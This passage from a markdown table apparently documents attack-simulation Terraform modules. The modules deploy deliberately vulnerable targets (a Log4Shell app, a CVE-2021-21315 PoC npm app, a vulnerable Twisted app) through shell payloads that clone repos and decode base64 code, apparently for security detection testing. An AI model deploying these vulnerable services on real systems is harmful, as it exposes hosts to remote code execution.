&quot;Cookie: oraclelicense=accept&amp;#45;securebackup&amp;#45;cookie&quot; http://download&amp;#46;oracle&amp;#46;com/otn&amp;#45;pub/java/jdk/8u131&amp;#45;b11/d54c1d3a095b4ff2b6607d096fa80163/jdk&amp;#45;8u131&amp;#45;linux&amp;#45;x64&amp;#46;tar&amp;#46;gz<br/>        mkdir &amp;#45;p /usr/java<br/>        sudo tar &amp;#45;xvzf jdk&amp;#45;8u131&amp;#45;linux&amp;#45;x64&amp;#46;tar&amp;#46;gz &amp;#45;C /usr/java<br/>    else<br/>        log &quot;jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131 found &amp;#45; skipping install&quot;<br/>    fi<br/>    <br/><br/>    &amp;#35; update java path<br/>    log &quot;setting up java environment for build&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    export JAVA&amp;&amp;#35;95;HOME=/usr/java/jdk1&amp;#46;8&amp;#46;0&amp;&amp;#35;95;131/<br/>    sudo update&amp;#45;alternatives &amp;#45;&amp;#45;install /usr/bin/java java $$&amp;&amp;#35;123;JAVA&amp;&amp;#35;95;HOME%&amp;&amp;#35;42;/&amp;&amp;#35;125;/bin/java 20000<br/>    sudo update&amp;#45;alternatives &amp;#45;&amp;#45;install /usr/bin/javac javac $$&amp;&amp;#35;123;JAVA&amp;&amp;#35;95;HOME%&amp;&amp;#35;42;/&amp;&amp;#35;125;/bin/javac 20000<br/>    <br/>    java &amp;#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &amp;#35; download gradle 7&amp;#46;3&amp;#46;1<br/>    log &quot;checking for gradle 7&amp;#46;3&amp;#46;1&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;&amp;#35;91; &amp;#33; &amp;#45;d /opt/gradle/gradle&amp;#45;7&amp;#46;3&amp;#46;1 &amp;&amp;#35;93;; then<br/>        log &quot;gradle not found &amp;#45; installing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        wget https://services&amp;#46;gradle&amp;#46;org/distributions/gradle&amp;#45;7&amp;#46;3&amp;#46;1&amp;#45;bin&amp;#46;zip<br/>        mkdir /opt/gradle<br/>        unzip &amp;#45;d /opt/gradle gradle&amp;#45;7&amp;#46;3&amp;#46;1&amp;#45;bin&amp;#46;zip<br/>    else<br/>        log &quot;gradle 7&amp;#46;3&amp;#46;1 found &amp;#45; skipping install&quot; <br/>    fi<br/><br/>    &amp;#35; update gradle path<br/>    log &quot;updating environment PATH to include gradle&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle&amp;#45;7&amp;#46;3&amp;#46;1/bin<br/>    gradle &amp;#45;&amp;#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &amp;#35; clone the log4shell vulnerable app<br/>    log &quot;cloning https://github&amp;#46;com/christophetd/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    git clone https://github&amp;#46;com/christophetd/log4shell&amp;#45;vulnerable&amp;#45;app<br/>    cd log4shell&amp;#45;vulnerable&amp;#45;app<br/>    log &quot;running gradle build&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    nohup gradle bootJar &amp;#45;&amp;#45;no&amp;#45;daemon &amp;<br/>    GRADLE&amp;&amp;#35;95;PID=$&amp;#33;<br/>    while kill &amp;#45;0 $GRADLE&amp;&amp;#35;95;PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete&amp;#46;&quot;<br/>    <br/>    ls &amp;#45;ltr build/libs/&amp;&amp;#35;42;&amp;#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &amp;#35; copy java jar<br/>    log &quot;Copying java jar&amp;#46;&amp;#46;&quot;<br/>    cp build/libs/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    &amp;#35; change to app root dir<br/>    cd $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/><br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep &amp;#45;f &quot;log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar&quot;; then<br/>            kill &amp;#45;9 $&amp;&amp;#35;40;pgrep &amp;#45;f &quot;log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar&quot;&amp;&amp;#35;41;<br/>        fi<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;m java &amp;#45;jar $&amp;&amp;#35;123;local&amp;#46;app&amp;&amp;#35;95;dir&amp;&amp;#35;125;/log4shell&amp;#45;vulnerable&amp;#45;app&amp;#45;0&amp;#46;0&amp;#46;1&amp;#45;SNAPSHOT&amp;#46;jar &amp;#45;&amp;#45;server&amp;#46;port=$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;log4j&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl unzip git&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl unzip git&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    web = file&amp;&amp;#35;40;<br/>                            &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/web&amp;#46;py&quot;,<br/>                        &amp;&amp;#35;41;<br/><br/>    ldap = file&amp;&amp;#35;40;<br/>                            &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/ldap&amp;#46;py&quot;,<br/>                        &amp;&amp;#35;41;<br/>    requirements = file&amp;&amp;#35;40;<br/>                            &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/requirements&amp;#46;txt&quot;,<br/>                        &amp;&amp;#35;41;<br/>    <br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| attacker-vulnerable-npm-app                              | ./modules/runbook/deploy-npm-app                     | runbook_deploy_npm_app                           | context.azure.runbook.vulnerable.npm_app                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;npm_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                     | <pre>locals &amp;&amp;#35;123;<br/>    repo = &quot;https://github&amp;#46;com/ForbiddenProgrammer/CVE&amp;#45;2021&amp;#45;21315&amp;#45;PoC&quot;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    screen &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>    truncate &amp;#45;s 0 /tmp/vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log<br/>    log &quot;checking for git&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    while &amp;#33; command &amp;#45;v git; do<br/>        log &quot;git not found &amp;#45; waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $&amp;&amp;#35;40;command &amp;#45;v  git&amp;&amp;#35;41;&quot;<br/>    rm &amp;#45;rf /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;&amp; &amp;&amp;#35;92;<br/>    mkdir /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;&amp; &amp;&amp;#35;92;<br/>    cd /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;&amp; &amp;&amp;#35;92;<br/>    git clone $&amp;&amp;#35;123;local&amp;#46;repo&amp;&amp;#35;125; &amp;&amp; &amp;&amp;#35;92;<br/>    cd CVE&amp;#45;2021&amp;#45;21315&amp;#45;PoC &amp;&amp; &amp;&amp;#35;92;<br/>    echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;index&amp;&amp;#35;95;js&amp;&amp;#35;95;base64&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; index&amp;#46;js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;m npm start &amp;#45;&amp;#45;prefix /vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target/CVE&amp;#45;2021&amp;#45;21315&amp;#45;PoC<br/>        screen &amp;#45;S vuln&amp;&amp;#35;95;npm&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl nodejs npm&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl nodejs npm&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    index&amp;&amp;#35;95;js&amp;&amp;#35;95;base64 = templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/index&amp;#46;js&quot;,<br/>                &amp;&amp;#35;123;<br/>                    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;<br/>    <br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| attacker-vulnerable-python3-twisted-app                  | ./modules/runbook/deploy-python3-twisted-app         | runbook_deploy_python3_twisted_app               | context.azure.runbook.vulnerable.python3_twisted_app              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;python3_twisted_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app         | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port=var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    screen &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>    screen &amp;#45;wipe<br/>    truncate &amp;#45;s 0 /tmp/vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log<br/>    if command &amp;#45;v $PACKAGE&amp;&amp;#35;95;MANAGER &amp;&amp; $PACKAGE&amp;&amp;#35;95;MANAGER list &amp;#124; grep &quot;python3&amp;#45;twisted&quot; &amp;#124; grep &quot;18&amp;#46;9&amp;#46;0&amp;#45;11ubuntu0&amp;#46;20&amp;#46;04&quot;; then<br/>        mkdir &amp;#45;p /vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app<br/>        cd /vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;app&amp;&amp;#35;95;py&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; app&amp;#46;py<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;requirements&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; requirements&amp;#46;txt<br/>        log &quot;installing requirements&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        python3 &amp;#45;m pip install &amp;#45;r requirements&amp;#46;txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X quit<br/>            screen &amp;#45;wipe<br/>            screen &amp;#45;d &amp;#45;L &amp;#45;Logfile /tmp/vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target&amp;#46;log &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;m python3 /vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app/app&amp;#46;py<br/>            screen &amp;#45;S vuln&amp;&amp;#35;95;python3&amp;&amp;#35;95;twisted&amp;&amp;#35;95;app&amp;&amp;#35;95;target &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            while &amp;#33; curl &amp;#45;sv http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#124; tee &amp;#45;a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45; retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>            sleep 1800<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3&amp;#45;twisted/focal&amp;#45;updates,focal&amp;#45;security,now 18&amp;#46;9&amp;#46;0&amp;#45;11ubuntu0&amp;#46;20&amp;#46;04&amp;#46;1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;curl python3&amp;#45;pip&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;curl python3&amp;#45;pip&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    app&amp;&amp;#35;95;py = templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/app&amp;#46;py&quot;,<br/>                &amp;&amp;#35;123;<br/>                    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;<br/>    requirements = templatefile&amp;&amp;#35;40;<br/>                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/requirements&amp;#46;txt&quot;,<br/>                &amp;&amp;#35;123;<br/>                &amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           